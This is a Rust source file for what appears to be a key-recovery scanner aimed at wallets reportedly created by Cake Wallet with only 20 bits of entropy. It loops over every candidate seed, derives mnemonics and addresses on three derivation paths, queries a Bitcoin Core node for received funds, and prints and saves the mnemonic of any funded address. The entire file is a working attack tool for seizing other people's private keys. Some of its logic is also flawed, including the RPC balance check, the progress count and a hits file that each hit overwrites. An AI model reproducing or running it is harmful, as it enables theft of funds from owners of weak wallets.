use anyhow::Result;
use bitcoin::bip32::{DerivationPath, Xpriv};
use bitcoin::secp256k1::Secp256k1;
use bitcoin::{Network, Address};
use bip39::Mnemonic;
use std::str::FromStr;
use std::io::Write;
use bitcoincore_rpc::{Auth, Client, RpcApi};


/// Scans Cake Wallet vulnerable addresses (20-bit entropy) and checks balances via Bitcoin Core RPC
pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
    println!("Cake Wallet RPC Scanner - Checking 2^20 vulnerable addresses...");
    println!("Connecting to Bitcoin Core at {}...", rpc_url);

    let rpc = Client::new(rpc_url, Auth::UserPass(rpc_user.to_string(), rpc_pass.to_string()))?;
    
    // Test connection
    let blockchain_info = rpc.get_blockchain_info()?;
    println!("Connected! Synced to block: {}", blockchain_info.blocks);
    println!("Chain: {}", blockchain_info.chain);

    let secp = Secp256k1::new();
    let network = Network::Bitcoin;
    
    // 20 bits = 1,048,576 possibilities
    let max_entropy = 1 << 20;
    
    println!("Scanning {} possible seeds...", max_entropy);
    println!("This will take approximately {} minutes at 1000 checks/sec", max_entropy / 1000 / 60);

    let mut checked = 0;
    let mut found = 0;
    let start = std::time::Instant::now();

    for i in 0..max_entropy {
        // Create deterministic entropy from small integer
        let mut entropy = [0u8; 32];
        entropy[0..4].copy_from_slice(&(i as u32).to_be_bytes());
        
        let mnemonic = Mnemonic::from_entropy(&entropy[0..16])?;
        let seed = mnemonic.to_seed("");
        let root = Xpriv::new_master(network, &seed)?;

        // Check multiple derivation paths
        let paths = [
            ("m/0'/0/0", "Cake"),
            ("m/44'/0'/0'/0/0", "Legacy"),
            ("m/84'/0'/0'/0/0", "SegWit"),
        ];

        for (path_str, path_type) in paths {
            if let Ok(path) = DerivationPath::from_str(path_str) {
                if let Ok(child) = root.derive_priv(&secp, &path) {
                    let pubkey = child.to_keypair(&secp).public_key();
                    let compressed_pubkey = bitcoin::CompressedPublicKey(pubkey);
                    
                    let address = match path_type {
                        "Legacy" => Address::p2pkh(&compressed_pubkey, network),
                        "SegWit" | "Cake" => Address::p2wpkh(&compressed_pubkey, network),
                        _ => continue,
                    };

                    // Check balance via RPC
                    match rpc.get_received_by_address(&address, Some(0)) {
                        Ok(amount) => {
                            if amount.to_sat() > 0 {
                                found += 1;
                                println!("\n🎯 FOUND! Seed: {}, Path: {}, Address: {}, Amount: {} BTC", 
                                    i, path_str, address, amount.to_btc());
                                println!("Mnemonic: {}", mnemonic);
                                
                                // Write to file
                                std::fs::write(
                                    "cake_wallet_hits.txt",
                                    format!("Seed: {}\nMnemonic: {}\nPath: {}\nAddress: {}\nAmount: {} BTC\n\n",
                                        i, mnemonic, path_str, address, amount.to_btc())
                                )?;
                            }
                        }
                        Err(e) => {
                            // Address might not be in wallet, which is fine
                            if !e.to_string().contains("Invalid Bitcoin address") {
                                eprintln!("RPC error for {}: {}", address, e);
                            }
                        }
                    }
                }
            }
        }

        checked += 1;
        if checked % 1000 == 0 {
            let elapsed = start.elapsed().as_secs_f64();
            let rate = checked as f64 / elapsed;
            print!("\rChecked: {}/{} ({:.1}%) - Speed: {:.0} addr/sec - Found: {}", 
                checked, max_entropy * 3, (checked as f64 / (max_entropy * 3) as f64) * 100.0, rate, found);
            std::io::stdout().flush().ok();
        }
    }

    println!("\n\nScan complete!");
    println!("Total checked: {}", checked);
    println!("Total found: {}", found);

    Ok(())
}
